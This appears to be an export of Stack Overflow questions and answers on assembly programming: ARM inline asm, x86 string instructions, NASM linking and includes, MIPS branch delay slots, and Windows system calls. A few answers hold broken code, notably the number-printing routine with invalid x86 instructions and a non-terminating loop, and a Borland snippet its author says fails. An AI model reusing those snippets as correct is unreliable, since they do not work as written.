While the answer was right for regular loads and stores, I found that the optimizer messes up auto-increment on vector instructions such as vldm/vstm. For instance, the following program </p>

<pre><code>#include &lt;stdio.h&gt;

int main()
{
        volatile int *in = new int[16];
        volatile int *out = new int[16];

        for (int i=0;i&lt;16;i++) in[i] = i;

        asm volatile (
        ""vldm   %0!, {d0-d3}            \n\t""
        ""vldm   %0,  {d4-d7}            \n\t""
        ""vstm   %1!, {d0-d3}            \n\t""
        ""vstm   %1,  {d4-d7}            \n\t""
        :: ""r""(in), ""r""(out)
        : ""memory"" );

        for (int i=0;i&lt;16;i++) printf(""%d\n"", out[i]);
        return 0;
}
</code></pre>

<p>compiled with</p>

<pre><code>g++ -O2 -march=armv7-a -mfpu=neon main.cpp -o main
</code></pre>

<p>will produce gibberish on the output of the last 8 variables, because the optimizer is keeping the incremented variable and using it for the printf. In other words, <code>out[i]</code> is actually <code>out[i+8]</code>, so the first 8 printed values are the last 8 from the vector and the rest are memory locations out of bounds.</p>

<p>I've tried with different combinations of the <code>volatile</code> keyword throughout the code, but the behavior changes only if I compile with the <code>-O0</code> flag or if I use a volatile vector instead of a pointer and new, like</p>

<pre><code>volatile int out[16];
</code></pre>
","<p>For store and load you do this:</p>

<pre><code>ldr r0,[r1],#4
str r0,[r2],#4
</code></pre>

<p>whatever you put at the end, 4 in this case, is added to the base register (r1 in the ldr example and r2 in the str example) after the register is used for the address but before the instruction has completed it is very much like</p>

<pre><code>unsigned int a,*b,*c;
...
a = *b++;
*c++ = a;
</code></pre>

<p>EDIT, you need to look at the disassembly to see what is going on, if anything.  I am using the latest code sourcery or now just sourcery lite from mentor graphics toolchain.</p>

<p>arm-none-linux-gnueabi-gcc (Sourcery CodeBench Lite 2011.09-70) 4.6.1</p>

<pre><code>#include &lt;stdio.h&gt;
int main ()
{
        int out[]={0, 0};
        asm volatile (
        ""mov    r0, #1          \n\t""
        ""str    r0, [%0], #4       \n\t""
        ""add    r0, r0, #1      \n\t""
        ""str    r0, [%0]        \n\t""
        :: ""r""(out)
        : ""r0"" );
        printf(""%d %d\n"", out[0], out[1]);
        return 0;
}


arm-none-linux-gnueabi-gcc str.c -O2  -o str.elf

arm-none-linux-gnueabi-objdump -D str.elf &gt; str.list


00008380 &lt;main&gt;:
    8380:   e92d4010    push    {r4, lr}
    8384:   e3a04000    mov r4, #0
    8388:   e24dd008    sub sp, sp, #8
    838c:   e58d4000    str r4, [sp]
    8390:   e58d4004    str r4, [sp, #4]
    8394:   e1a0300d    mov r3, sp
    8398:   e3a00001    mov r0, #1
    839c:   e4830004    str r0, [r3], #4
    83a0:   e2800001    add r0, r0, #1
    83a4:   e5830000    str r0, [r3]
    83a8:   e59f0014    ldr r0, [pc, #20]   ; 83c4 &lt;main+0x44&gt;
    83ac:   e1a01004    mov r1, r4
    83b0:   e1a02004    mov r2, r4
    83b4:   ebffffe5    bl  8350 &lt;_init+0x20&gt;
    83b8:   e1a00004    mov r0, r4
    83bc:   e28dd008    add sp, sp, #8
    83c0:   e8bd8010    pop {r4, pc}
    83c4:   0000854c    andeq   r8, r0, ip, asr #10
</code></pre>

<p>so the </p>

<pre><code>sub sp, sp, #8
</code></pre>

<p>is to allocate the two local ints out[0] and out[1]</p>

<pre><code>mov r4,#0
str r4,[sp]
str r4,[sp,#4]
</code></pre>

<p>is because they are initialized to zero, then comes the inline assembly</p>

<pre><code>8398:   e3a00001    mov r0, #1
839c:   e4830004    str r0, [r3], #4
83a0:   e2800001    add r0, r0, #1
83a4:   e5830000    str r0, [r3]
</code></pre>

<p>and then the printf:</p>

<pre><code>83a8:   e59f0014    ldr r0, [pc, #20]   ; 83c4 &lt;main+0x44&gt;
83ac:   e1a01004    mov r1, r4
83b0:   e1a02004    mov r2, r4
83b4:   ebffffe5    bl  8350 &lt;_init+0x20&gt;
</code></pre>

<p>and now it is clear why it didnt work.  you are didnt declare out as volatile.  You gave the code no reason to go back to ram to get the values of out[0] and out[1] for the printf, the compiler knows that r4 contains the value for both out[0] and out[1], there is so little code in this function that it didnt have to evict r4 and reuse it so it used r4 for the printf.</p>

<p>If you change it to be volatile</p>

<pre><code>    volatile int out[]={0, 0};
</code></pre>

<p>Then you should get the desired result:</p>

<pre><code>83a8:   e59f0014    ldr r0, [pc, #20]   ; 83c4 &lt;main+0x44&gt;
83ac:   e59d1000    ldr r1, [sp]
83b0:   e59d2004    ldr r2, [sp, #4]
83b4:   ebffffe5    bl  8350 &lt;_init+0x20&gt;
</code></pre>

<p>the preparation for printf reads from ram.</p>
","9102704"
"What does $ mean in assembly?","7655","","<p><code>Add #$28,R4,R3</code> What does <code>$</code> mean in this expression?  R4 value is 1224 and the end result should be 1264, but how this works I have no idea. </p>
","<p>In some assemblers, the '$' means simply that you are using a hex value. on the x86 architecture it usual to write the number with 'h' or if the first character is not a digit, then you have to use a zero in front <code>28h</code> or <code>0afh</code>.
In C you would write <code>0x28</code>.</p>

<p>For example on the 6510 (Commodore 64) or M68000 (i.e. Amiga) the '$' character was used for this like '$28'. I'm sure there are other assemblers as well using this notation.</p>
","20411270"
"function to mangle/demangle functions","7650","","<p>I have previously ,<a href=""https://stackoverflow.com/questions/4920610/c-class-function-in-assembly"">here</a>, been shown that C++ functions aren't easily represented in assembly. Now I am interested in reading 1 way or another because callgrind, part of valgrind, show them demangled while in assembly they are shown mangled, so i would like to either mangle the valgrind function output or demangle the assembly names of functions. Anyone ever tried something like that? I was looking at a <a href=""http://www.kegel.com/mangle.html"" rel=""nofollow noreferrer"">website</a> and found out the following:</p>

<blockquote>
<pre><code> Code to implement demangling is part of the GNU Binutils package; 
see libiberty/cplus-dem.c and include/demangle.h.
</code></pre>
</blockquote>

<p>anyone ever tried something like that, I want to demangle/mangle in C? my compiler is gcc 4.x</p>
","<p>Use the <code>c++filt</code> command line tool to demangle the name.</p>
","4939664"
"Assembly Programming on Mac","7647","","<p>I am on a Mac with Snow Leopard (10.6.3).  I hear that the assembly language I work with has to be valid with the chipset that you use.  I am completely new to this I have a basic background in C and Objective-C programming and an almost strong background in PHP. I have always wanted to see what assembly is all about.  </p>

<p>The tutorial I'll be looking at is by VTC <a href=""http://www.vtc.com/products/Assembly-Language-Programming-Tutorials.htm"" rel=""nofollow noreferrer"">[link]</a>.</p>

<p>What I want to know is: are the tutorials that I'm about to do compatible with the assembly version on the Mac that I have?</p>

<p>Sorry I am completely new to this language although I do recall studying some of it way, way back in the day. I do have xcode and what I'm wondering is what kind of document would I open in xcode to work with assembly and does the Mac have a built in hex editor (when it comes time to needing it)?</p>

<p>thanks</p>
","<p>The assembly language you use is not dependent on your OS but rather your CPU's instruction set. Judging by your Mac version, I'd say you are using an Intel processor - so you would want to learn x86 or amd64 assembly.</p>
","2656508"
"Confused with CMPSB instruction","7637","","<p>I have been looking at this code and I'm confused about the <strong>rep cmpsb</strong> line.</p>

<pre><code>.LOOP:
      push    cx
      mov     cx, 0x000B                            ; eleven character name
      mov     si, ImageName                         ; image name to find
      push    di
 rep  cmpsb                                         ; test for entry match
      pop     di
      je      LOAD_FAT
      pop     cx
      add     di, 0x0020                            ; queue next directory entry
      loop    .LOOP
      jmp     FAILURE
</code></pre>

<p>I understand that it repeats cmpsb cx times but how does this compare the two strings? Say for example was comparing ""Hey\0"" and ""hey\0"" and this loop was comparing 4 character strings. The first characters are different and the EFlags register would be set accordingly. However, the <strong>cmpsb</strong> instruction is repeated and the next characters would be the same. I may be misunderstanding how <strong>cmpsb</strong> works but it looks like this loop does not correctly compare two strings. Does this loop in fact work?</p>
","<p>The reason REP works is because rep has the same encoding as REPE (F3h). In principle REPE is the right thing to use here, but depending on your assembler it might just take REP as correct.</p>

<p>So in reality you have a REPE cmpsb there, it's just that your (dis)assembler doesn't really know.</p>
","10553105"
"Converting an ascii character into decimal in Assembly for use with WriteConsoleA and readConsoleA","7634","","<p>I am in a fix. I need to input numbers from the user and then perform arithmetic calculations on the input. I'm just a beginner now and till now I've not used any IO, except in a program which asks the user for a name and prints an output, using WriteConsoleA and ReadConsoleA. I couldn't find any help on google, on how to convert ascii characters to decimals for input and how to convert decimals to ascii for output. I'd prefer to do this manually before using any of the library functions. I can't figure how to convert a single character into a string and vice versa. How is this done?
And yeah, if you write code in the answers, if, possible, use masm syntax as i am not familiar with the other assemblers' syntax.
Thanks!!
Devjeet</p>
","<p>If you have a decimal like 31h on al, you can just add 30h to each one to convert them to ASCII characters, like (AL = 31h):</p>

<pre><code>mov cl,al
shr al, 4 // now al = 03
add al,30h // now al = 33h, which if you output is the ASCII character '3'
</code></pre>

<p>Now, you can restore al and shift left by 4 to get the next '1' and again add 30h. I hope this illustrates the point :)</p>
","5785786"
"Assembly How to convert REP STOS to C code","7627","","<p>I been debugging <code>REP STOS DWORD PTR ES:[EDI]</code> for a while now</p>

<p>From my conclusion it always uses </p>

<p><code>ECX</code> as counter.
<code>EAX</code> as the value that will be copied over <code>EDI</code> and then appended <code>ECX</code> times 
so after putting in the pointed dump of <code>EDI</code></p>

<p>it seems to overwrite the pointed data at EDI with what's
it seems it always only uses ECX as a counter, while changing EDI by 4 bytes.
it stops working when counter hits 0</p>

<p>So I came up with this kind of code</p>

<pre><code>while(regs.d.ecx != 0)
{
    *(unsigned int *)(regs.d.edi) = regs.d.eax;
    regs.d.edi += 4;
    regs.d.ecx--;
}
</code></pre>

<p>Seems to work.. but i'm concerned since I just did this by luck and guess work. Is it solid? like will it always be <code>ECX</code> as counter, <code>EAX</code> as data, and it always copies 4 bytes never less?</p>
","<p>You are almost correct.  The only difference is that the direction flag (<code>DF</code>) controls whether 4 is added or subtracted from <code>EDI</code> (and it actually is offset from the <code>ES</code> segment base, but you probably don't care about that):</p>

<pre><code>for (; regs.d.ecx != 0; regs.d.ecx--)
{
    *(unsigned int *)(regs.d.edi) = regs.d.eax;
    regs.d.edi += regs.eflags.df ? -4 : 4;
}
</code></pre>

<p>Note that the <code>for (; regs.d.ecx != 0; regs.d.ecx--) { }</code> is the action of the <code>REP</code> prefix, and the body of the loop is the action of <code>STOS DWORD...</code>.</p>

<p>Since you are asking a lot of these questions, I think you will find the <a href=""http://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-vol-2a-2b-instruction-set-a-z-manual.html"" rel=""noreferrer"">Intel 64 and IA-32 Architectures Software Developer’s Manual, Volumes 2A and 2B</a> to be useful.  These contain descriptions of each instruction and prefix, including pseudo-code descriptions.</p>
","7764011"
"Incrementing from 0 to 100 in assembly language","7609","","<p>This is kinda oddball, but I was poking around with the GNU assembler today (I want to be able to at least read the syntax), and was trying to get this little contrived example of mine to work. Namely I just want to go from 0 to 100, printing out numbers all the while. So a few minutes later I come up with this:</p>

<pre><code># count.s: print the numbers from 0 to 100. 
    .text
string: .asciz ""%d\n""
    .globl _main

_main:
    movl    $0, %eax # The starting point/current value.
    movl    $100,   %ebx # The ending point.

_loop:
    # Display the current value.
    pushl   %eax
    pushl   $string
    call     _printf
    addl     $8, %esp

    # Check against the ending value.
    cmpl    %eax, %ebx
    je    _end

    # Increment the current value.
    incl    %eax
    jmp _loop   

_end:
</code></pre>

<p>All I get from this is 3 printed over and over again. Like I said, just a little contrived example, so don't worry too much about it, it's not a life or death problem.</p>

<p>(The formatting's a little messed up, but nothing major).</p>
","<p>You can't trust what any called procedure does to any of the registers. 
Either push the registers onto the stack and pop them back off after calling printf or have the increment and end point values held in memory and read/written into registers as you need them. </p>

<p>I hope the following works. I'm assuming that pushl has an equivalant popl and you can push an extra couple of numbers onto the stack. </p>

<pre><code># count.s: print the numbers from 0 to 100. 
    .text
string: .asciz ""%d\n""
    .globl _main

_main:
    movl    $0, %eax # The starting point/current value.
    movl    $100,       %ebx # The ending point.

_loop:
    # Remember your registers.
    pushl   %eax
    pushl   %ebx

    # Display the current value.
    pushl   %eax
    pushl   $string
    call     _printf
    addl     $8, %esp

    # reinstate registers.
    popl   %ebx
    popl   %eax

    # Check against the ending value.
    cmpl    %eax, %ebx
    je    _end

    # Increment the current value.
    incl    %eax
    jmp _loop   

_end:
</code></pre>
","19453"
"Can't include a file in NASM","7603","","<p>I try to include a file into my boot.asm file using  </p>

<pre><code>%include ""input.asm""
</code></pre>

<p>But every time i try to compile it i get an error saying that nasm can't open the include file.<br>
<code>input.inc</code> IS in the same directory as boot.asm
I was looking here and on google for answers, but none has helped me.</p>

<p>Is there a special way include files should be compiled/formatted before including? Or is it just my nasm barking at me?</p>

<p>EDIT: Here's the code of include:</p>

<pre><code>mov ax, 0x07C0  ; set up segments
mov ds, ax    mov es, ax
mov si, welcome
call print_string
mov si, welcome2    
call print_string    
mov si, welcome4    
call print_string  
jmp .mainloop

%include 'input.asm'
mainloop:    ;loop here
</code></pre>

<p>input.asm:</p>

<pre><code> ; ================
 ; calls start here
 ; ================

 print_string:
   lodsb        ; grab a byte from SI

   or al, al  ; logical or AL by itself
   jz .done   ; if the result is zero, get out

   mov ah, 0x0E
   int 0x10      ; otherwise, print out the character!

   jmp print_string

 .done:
   ret

 get_string:
   xor cl, cl

 .loop:
   mov ah, 0
   int 0x16   ; wait for keypress

   cmp al, 0x08    ; backspace pressed?
   je .backspace   ; yes, handle it

   cmp al, 0x0D  ; enter pressed?
   je .done      ; yes, we're done

   cmp cl, 0x3F  ; 63 chars inputted?
   je .loop      ; yes, only let in backspace and enter

   mov ah, 0x0E
   int 0x10      ; print out character

   stosb  ; put character in buffer
   inc cl
   jmp .loop

 .backspace:
   cmp cl, 0    ; beginning of string?
   je .loop ; yes, ignore the key

   dec di
   mov byte [di], 0 ; delete character
   dec cl       ; decrement counter as well

   mov ah, 0x0E
   mov al, 0x08
   int 10h      ; backspace on the screen

   mov al, ' '
   int 10h      ; blank character out

   mov al, 0x08
   int 10h      ; backspace again

   jmp .loop    ; go to the main loop

 .done:
   mov al, 0    ; null terminator
   stosb

   mov ah, 0x0E
   mov al, 0x0D
   int 0x10
   mov al, 0x0A
   int 0x10     ; newline

   ret

 strcmp:
 .loop:
   mov al, [si]   ; grab a byte from SI
   mov bl, [di]   ; grab a byte from DI
   cmp al, bl     ; are they equal?
   jne .notequal  ; nope, we're done.



   cmp al, 0  ; are both bytes (they were equal before) null?
   je .done   ; yes, we're done.

   inc di     ; increment DI
   inc si     ; increment SI
   jmp .loop  ; loop!

 .notequal:
   clc  ; not equal, clear the carry flag
   ret

 .done:     
   stc  ; equal, set the carry flag
   call print_string
   ret
</code></pre>

<p>Error msg:</p>

<blockquote>
  <p>D:\ASMT\boot.asm:14: fatal: unable to open include file `input.asm'</p>
</blockquote>
","<p>It seems that <code>NASM</code> include the files from the current directory :</p>

<blockquote>
  <p>Include files are searched for in the current directory (<strong>the directory you're in when you run NASM</strong>, as opposed to the location of the NASM executable or the location of the source file), plus any directories specified on the NASM command line using the -i option.</p>
</blockquote>

<p>If you are executing <code>NASM</code> from another directory that <code>D:\ASMT</code> in your case, it is normal that it doesn't work.</p>

<p>Source : <a href=""http://www.nasm.us/doc/nasmdoc4.html#section-4.6.1"" rel=""noreferrer"">http://www.nasm.us/doc/nasmdoc4.html#section-4.6.1</a></p>
","18079206"
"Permanently Change Disassembly Flavor in GDB","7599","","<p>How can I permanently change the disassembly flavor in GDB.  I tried:<code>set disassembly-flavor intel</code> in GDB, but when I fire up GDB later it still has the att flavor.</p>
","<p>gdb executes a ~/.gdbinit file when it starts, if present; you should be able to add the line</p>

<pre><code>set disassembly-flavor intel
</code></pre>

<p>to it.</p>
","8569435"
"shrl vs sarl .. x86 Assembly gnu","7576","","<p>I'm compiling my code with gcc and looking at the assembly, what is this code exactly doing? </p>

<pre><code>shrl $20, %edx
leal (%edx,%eax), %eax
sarl 1, %eax 
</code></pre>

<p>Say that the variable X is at the edx register, and Y is at eax and both are (32-bit int). What is going on here??</p>

<p>I know 'shrl $20, %edx' is shifting %eax right 20 bits, so is same as: eax/(2^20)
and then sarl is the same so 'sarl 1, %eax' = eax/(2^1).
Is that right, and if so what does leal do? </p>
","<p>Assuming that <code>sarl 1, %eax</code> is really supposed to be <code>sarl $1, %eax</code>, then the whole thing equates to:</p>

<pre><code>x = ((unsigned int) x) &gt;&gt; 20;
y = (x + y) &gt;&gt; 1
</code></pre>

<p>The <code>leal</code> instruction means: <code>eax = eax + edx</code>.  This <a href=""http://en.wikibooks.org/wiki/X86_Assembly/GAS_Syntax#Address_operand_syntax"" rel=""noreferrer"">link</a> might be useful to you, as well as <a href=""http://en.wikibooks.org/wiki/X86_Assembly/Shift_and_Rotate"" rel=""noreferrer"">this one</a>.</p>
","15695990"
"a Simple ""Hello World"" Inline Assembly language Program in C/C++","7554","","<p>i use devcpp and borland c compiler....</p>

<pre><code>asm {
    mov ax,4       // (I/O Func.)
    mov bx,1       // (Output func)  
    mov cx,&amp;name   // (address of the string)
    mov dx,6       // (length of the string)
    int 0x21       // system call
}
</code></pre>

<p>in the above code snippets i want to print a string with the help of assembly language...
but how can i put the address of the string in register cx....</p>

<p>is there something wrong in code???</p>
","<p>I don't have the Borland compiler on hand, so I might be misremembering its syntax, but have you tried this:</p>

<pre><code>asm {
    mov ax,4       // (I/O Func.)
    mov bx,1       // (Output func)  
    lds cx,""Hello, world"" // (address of the string)
    mov dx,6       //  (length of the string)
    int 0x21       // system call
}
</code></pre>

<p>or this:</p>

<pre><code>char msg[] = ""Hello, world"";

asm {
    mov ax,4       // (I/O Func.)
    mov bx,1       // (Output func)  
    lds cx, msg   // (address of the string)
    mov dx,6       //  (length of the string)
    int 0x21       // system call
}
</code></pre>

<p><strong>edit:</strong> although this will compile (now that I've changed MOV to LDS), it will still throw an error at runtime. I'll try again...</p>
","2180207"
"MIPS BNE Instruction","7550","","<p>I have a set of instructions as follows:</p>

<pre><code>loop:
        sll  $t1, $t0, 2              # t1 = (i * 4)
        add $t2, $a0, $t1             # t2 contains address of array[i]
        sw $t0, 0($t2)                # array[i] = i

        addi $t0, $t0, 1              # i = i+1
        add $t4, $t4, $t0             # sum($t4) = ($t4 + array[i])

        slt $t3, $t0,   $a1             # $t3 = ( i &lt; array_size)
        bne $t3, $zero, loop          # if ( i &lt; array_size ) then loop
</code></pre>

<p>The <code>sll</code> instruction has an address (program counter) of <code>0x18</code>. <code>bne</code> has an address of <code>0x30</code>. MARS Simulator interprets the <code>bne</code> instruction as: <code>bne $11, $0, 0xfff9</code>. <code>0xfff9</code> is <code>-7</code>, meaning the instruction will jump 7 steps back. However, <code>sll</code> is six steps back. Does MIPS take into account the current instruction? Or does this happen because the program counter is incremented in the <code>fetch</code> stage, before the instruction finishes executing?</p>
","<p>On branch mips executes <em>two</em> instructions -- the branch instruction itself and the one following it (so called branch delay slot).</p>

<p>At the time branch takes effect, PC points to the instruction that <em>follows</em> the branch instruction itself, so -7 is appropriate.</p>
","8335140"
"Learning to read GCC assembler output","7544","","<p>I'm considering picking up some very rudimentary understanding of assembly. My current goal is simple: <strong>VERY BASIC</strong> understanding of GCC assembler output when compiling C/C++ with the -S switch for x86/x86-64.</p>

<p>Just enough to do simple things such as looking at a single function and verifying whether GCC optimizes away things I expect to disappear.</p>

<p>Does anyone have/know of a truly concise introduction to assembly, relevant to GCC and specifically for the purpose of reading, and a list of the most important instructions anyone casually reading assembly should know?</p>
","<p>If you're using gcc or clang, the -masm=intel argument tells the compiler to generate assembly with Intel syntax rather than AT&amp;T syntax, and the --save-temps argument tells the compiler to save temporary files (preprocessed source, assembly output, unlinked object file) in the directory GCC is called from.  </p>

<p>Getting a superficial understanding of x86 assembly should be easy with all the resources out there. Here's one such resource: <a href=""http://www.cs.virginia.edu/~evans/cs216/guides/x86.html"" rel=""noreferrer"">http://www.cs.virginia.edu/~evans/cs216/guides/x86.html</a> .</p>

<p>You can also just use disasm and gdb to see what a compiled program is doing.</p>
","2611425"
"Attempt to execute non instruction","7543","","<p>This is a mips assembly code for a C code.I am simulating it using Qtspim, but I am getting an error as titled above.</p>

<pre><code>    .text

# j=$s0 , i=$t0 

main:
        li $s0,5 # setting j to 5 
        li $t0,0 # setting i to zero


loop:
        slti $t1,$t0,8
        bne $t1,1,Exit
        add $s0,$s0,$t0
        addi $t0,$t0,1
        beq $s0,10,Exit
        j loop


Exit:       
</code></pre>

<p>The C code which I am trying to convert into assembly is as below</p>

<pre><code>  j=5;

for(t=0,i&lt;8;i++){

    j=j+1;
    if(j==10)
        return;
}
</code></pre>
","<p>The assembly code seems ok. I guess your problem is that you have <a href=""http://en.wikipedia.org/wiki/Delay_slot"" rel=""nofollow""><em>delayed branching</em></a> enabled in QtSpim.
This means that the instruction that follows a branch is always executed, regardless of the action taken by the branch.</p>

<p>The easy fix is either to disable delayed branching, or to add a <code>NOP</code> after any branch instruction.</p>

<p>In your code:</p>

<pre><code>.text
main:
        li $s0,5 # setting j to 5 
        li $t0,0 # setting i to zero


loop:
        slti $t1,$t0,8
        bne $t1,1,Exit
        nop             # added a nop to prevent the addition when branch is taken
        add $s0,$s0,$t0
        addi $t0,$t0,1
        beq $s0,10,Exit
        j loop
        nop             # added a nop to prevent executing unknown data after the unconditional jump
Exit:   
        j Exit          # code added so we don't drop off executing after this point
        nop
</code></pre>
","13290000"
"Simple way to print value of a register in x86 assembly","7538","","<p>I need to write a program in 8086 Assembly that receives data from the user, does some mathematical calculations and prints the answer on the screen, I have written all parts of the program and all work fine but I don't know how to print the number to the screen.</p>

<p>At the end of all my calculation the answer is AX and it is treated as an unsigned 16 bit integer. How do I print the decimal (unsigned) value of the AX register?</p>
","<p>you could use the C-library function itoa,
implementing it isn't that hard, basicaly, you do:</p>

<pre><code>while (x){
    buff[n]==x % 10;
    x/=10;
    n++;
}
</code></pre>

<p>and then invert the buffer (or print character-wise backwards)</p>

<p>void print_number(int x);</p>

<pre><code>print_number:
  buff db 15 dup(0)
  mov ax,[esp+4]
  mov bx,0
itoa_w1:

  mov cx, ax
  mod cx,10
  add cx,30h;'0'
  div ax,10
  mov buff[bx],cl
  cmp ax,0
  jnz itoa_w1

itoa_w2:
  push buff[bx]
  call putchar
  pop  ax
  cmp  bx,0
  jnz itoa_w2

ret
</code></pre>
","2709122"
"Linking C with NASM","7532","","<p>I have a NASM file and a C file. How do I call a function in the C file from the NASM file? How do I call a NASM function from the C file?</p>

<p>Many Thanks
DD</p>
","<p>Calling assembly function from C:</p>

<p>C file:</p>

<pre><code>#include &lt;stdio.h&gt;

int add(int a, int b);

int main(int argc, char **argv)
{
  printf(""%d\n"", add(2, 6));
  return 0;
}
</code></pre>

<p>assembly file:</p>

<pre><code>global add

section .data

section .text

add:
    mov   eax, [esp+4]   ; argument 1
    add   eax, [esp+8]   ; argument 2
    ret
</code></pre>

<p>compiling:</p>

<pre><code>$ nasm -f elf add.asm 
$ gcc -Wall main.c add.o 
$ ./a.out 
8
$ 
</code></pre>

<p>Calling C function from assembly:</p>

<p>C file:</p>

<pre><code>int add(int a, int b)
{
  return a + b;
}
</code></pre>

<p>assembly file:</p>

<pre><code>extern add
extern printf
extern exit

global _start

section .data
  format db ""%d"", 10, 0
section .text

_start:
    push  6
    push  2
    call  add     ; add(2, 6)

    push  eax
    push  format
    call  printf  ; printf(format, eax)

    push  0
    call exit     ; exit(0)
</code></pre>

<p>compiling:</p>

<pre><code>$ gcc -Wall -c add.c
$ nasm -f elf main.asm 
$ ld main.o add.o -lc -I /lib/ld-linux.so.2
$ ./a.out 
8
$ 
</code></pre>
","24992571"
"Windows system calls","7506","","<p>I have a (very) basic understanding of assembly using system calls on Linux (I use the GNU assembler <code>as</code>).
On Windows 7, I am using the MinGW (32-bit) port of the GCC compiler suite to produce assembler programs. On Linux I regularily use the C library for some OS interactions in my assembler programs, and on my Windows platform this works perfectly as well using MinGW. Sometimes, however, I want to use low-level system calls -- mostly to keep my executables as small as possible. On Linux I know how to do this:</p>

<pre><code>movl        $0, %ebx
movl        $1, %eax
int $0x80   ; exit with code 0
</code></pre>

<p>I also use these system calls for reading/writing chars to/from the terminal (for writing syscall with 4 in EAX for example). I was wondering how to do this on a Windows NT platform. Is it possible? I looked at <a href=""http://j00ru.vexillium.org/ntapi/"">this table</a>, but I don't really understand the names of the syscalls. Any help is welcome.</p>
","<p>The <code>Nt*</code> set of functions are undocumented with good reason: it's internal to Windows and changes between versions, meaning that programs that target it directly are at high-risk of breaking between Windows versions.</p>

<p>Really, there is not that big an overhead with targeting public, documented functions, and you get Microsoft's guarantee that your program <em>will</em> work with future versions of Windows provided you use the API correctly.</p>

<p>For that reason, I won't provide you with the answer you want. I strongly advise you to use the public console API: <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682073%28v=vs.85%29.aspx"" rel=""noreferrer"">http://msdn.microsoft.com/en-us/library/windows/desktop/ms682073%28v=vs.85%29.aspx</a></p>

<h3>Update</h3>

<p>It seems my answer is quite controversial! As of late-March 2017 this answer has 4 upvotes but 6 downvotes. I'll defend my position by saying that the OP did not make it clear this is for experimentation or fun, indeed he wrote:</p>

<blockquote>
  <p>Sometimes, however, I want to use low-level system calls -- mostly to keep my executables as small as possible.</p>
</blockquote>

<p>...I find this line of reasoning problematic and I don't want to act as an enabler for these kinds of development practices, especially as there is no practical benefit to using syscalls for console tasks. Is it really right to downvote me for not answering this question directly while my answers for ""SQL by concatenation"" questions also don't give the OP what they want but tell them to use parameterisation and are upvoted quite strongly?</p>

<p>If someone wants to know how to use low-level syscalls in Windows then please post a new question, suitably framed, and I'll gladly answer it.</p>
","21074450"
"How to get Python to use Assembly","7503","","<p>I am a beginner in assembly, but a master in Python. I have just recently started to learn x86_64 NASM for windows, and I wish to combine the power of assembly, and the flexibility of Python. I have looked all over, and I have not found a way to use a NASM assembly procedure from within Python. By this I do not mean in-line assembly. I wish to write an assembly program, compile it, and then somehow extract the procedure to use in my Python program. Can someone illustrate a simple example of how to do this, as I am completely lost.</p>
","<p>You could create a <a href=""https://docs.python.org/2/extending/extending.html"">C extension</a> wrapper for the functions implemented in assembly and link it to the OBJ file created by nasm. </p>

<p>A dummy example (for 32 bit Python 2; not tested):</p>

<p><strong>myfunc.asm:</strong></p>

<pre><code>;http://www.nasm.us/doc/nasmdoc9.html
global  _myfunc 
section .text
_myfunc: 
    push    ebp 
    mov     ebp,esp 
    sub     esp,0x40        ; 64 bytes of local stack space 
    mov     ebx,[ebp+8]     ; first parameter to function 
    ; some more code 
    leave
    ret
</code></pre>

<p><strong>myext.c:</strong></p>

<pre><code>#include &lt;Python.h&gt;

void myfunc(void);

static PyObject*
py_myfunc(PyObject* self, PyObject* args)
{
    if (!PyArg_ParseTuple(args, """"))
        return NULL;
    myfunc();
    Py_RETURN_NONE;
}

static PyMethodDef MyMethods[] =
{
    {""myfunc"", py_myfunc, METH_VARARGS, NULL},
    {NULL, NULL, 0, NULL}
};

PyMODINIT_FUNC initmyext(void)
{
    (void) Py_InitModule(""myext"", MyMethods);
}
</code></pre>

<p><strong>setup.py:</strong></p>

<pre><code>from distutils.core import setup, Extension
setup(name='myext', ext_modules=[
    Extension('myext', ['myext.c'], extra_objects=['myfunc.obj'])])
</code></pre>

<p><strong>Build and run:</strong></p>

<p><code>nasm -fwin32 myfunc.asm</code></p>

<p><code>python setup.py build_ext --inplace</code></p>

<p><code>python -c""import myext;myext.myfunc()""</code></p>
","24463369"
"Concatenate two given strings in 8086 + MOVSB does not work","7502","","<p>I'm trying to write a 8086 assembly program to concatenate two given strings.
In order to do this, I used a ""<em>REP MOVSB</em>"" instruction, but the program didn't work well. So I wrote a program that should statically concatenate two strings, but it seems that ""<em>REP MOVSB</em>"" does not affect on strings at all.
Here's the part of code I wrote for test:</p>

<pre>                                          
data    segment

string1 db  ""Lotfi"", 0
string2 db  ""Ali "", 0 

data ends


code segment    

ASSUME  CS: code, DS: data

start:
    cld
    mov     ax  , data
    mov     DS  , ax

    mov     SI  , offset string1
    mov     DI  , offset string2
    add     DI  , 3 ; Adding the length of destination string to the DI


    mov     cx  , 5
    rep movsb ; This should concat two strings

    ; Printing the result character by character on the console
    mov     SI  , offset string2
l:  lodsb           ; Printing loop
    mov dl, al
    mov ah, 2h
    int 21h
    jmp l


    hlt 

    code ends
end start
</pre>

<p>The result of the code is something like:</p>

<pre>
Ali             ü,Z0???... (And so)
</pre>

<p>What's wrong with my code?
Tanx</p>
","<p><code>movsb</code> moves from DS:SI to ES:DI. You've loaded the DS but not the ES register.</p>

<p>You need only add a single line:</p>

<pre><code>cld
mov     ax  , data
mov     DS  , ax
mov     ES  , ax   ; here!
</code></pre>
","27589230"
"Learn Assembly Language using Raspberry Pi?","7502","","<p>I did a bit of searching but couldn't find a definitive answer on this, so I am hoping I can get your opinion.</p>

<p>I would like to learn Assembly Language (ARM) - would the Raspberry Pi be a good choice for this?</p>

<p>From what I can see it seems there are a few gentle tutorials for doing things like making the LED flash, etc., so from a newbie perspective it isn't too scary, and it actually seems like a lot of fun.</p>

<p>If I started with the Raspberry Pi and then moved onto using disassemblers to build up my knowledge, am I on a good path or am I starting on the wrong foot?</p>

<p>Thank you for your comments.</p>
","<p>Yes and no.  If this is your first assembly language, ARM is a good one (x86 is a bad one) to start with (there are other good ones).  I recommend learning first using an instruction set simulator.  This can give you better visibility into what is going on and will give you a better chance at success (less of a chance of giving up due to frustration).   Once you get your feet wet with the tools, building bare metal programs, etc.  then the raspberry pi is not a bad platform.  the peripherals although poorly documented are very simple to use (compared to other similar platforms) there is enough of a community and examples out there to compensate for the documentation.  the raspberry pi can be considered non-brickable from the ARM's perspective.  Bricking a board trying to make your first blinking led program can be quite frustrating.  </p>

